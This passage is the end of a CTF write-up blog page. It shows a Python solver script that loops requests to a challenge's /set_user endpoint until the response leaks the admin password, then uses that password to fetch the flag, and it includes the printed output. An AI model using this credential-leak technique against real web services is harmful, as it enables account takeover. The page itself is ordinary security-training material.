+</span></span><span style=display:flex><span>ses <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#e6db74>&#34;hoge&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;huga&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>):
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;count:&#34;</span>, i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> ses<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>base_url<span style=color:#e6db74>}</span><span style=color:#e6db74>/set_user&#39;</span>, json<span style=color:#f92672>=</span>data)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;response text:&#34;</span>, response<span style=color:#f92672>.</span>json())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#e6db74>&#34;admin&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;password&#34;</span>: response<span style=color:#f92672>.</span>json()[<span style=color:#e6db74>&#34;authPW&#34;</span>] <span style=color:#75715e># ********************************</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> ses<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>base_url<span style=color:#e6db74>}</span><span style=color:#e6db74>/get_flag&#39;</span>, json<span style=color:#f92672>=</span>data)
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;/get_flag&#34;</span>)
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;response text:&#34;</span>, response<span style=color:#f92672>.</span>json())
+</span></span></code></pre></div><pre tabindex=0><code>$ python3 solver.py 
+count: 1
+response text: {&#39;authId&#39;: &#39;hoge&#39;, &#39;authPW&#39;: &#39;huga&#39;, &#39;grade&#39;: &#39;guest&#39;}
+...
+count: 9
+response text: {&#39;authId&#39;: &#39;hoge&#39;, &#39;authPW&#39;: &#39;huga&#39;, &#39;grade&#39;: &#39;guest&#39;}
+count: 10
+response text: {&#39;authId&#39;: &#39;admin&#39;, &#39;authPW&#39;: &#39;********************************&#39;, &#39;grade&#39;: &#39;admin&#39;}
+/get_flag
+response text: {&#39;flag&#39;: &#39;great! here is your flag: RicSec{j4v45cr1p7_15_7000000000000_d1f1cul7}&#39;}
+</code></pre></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
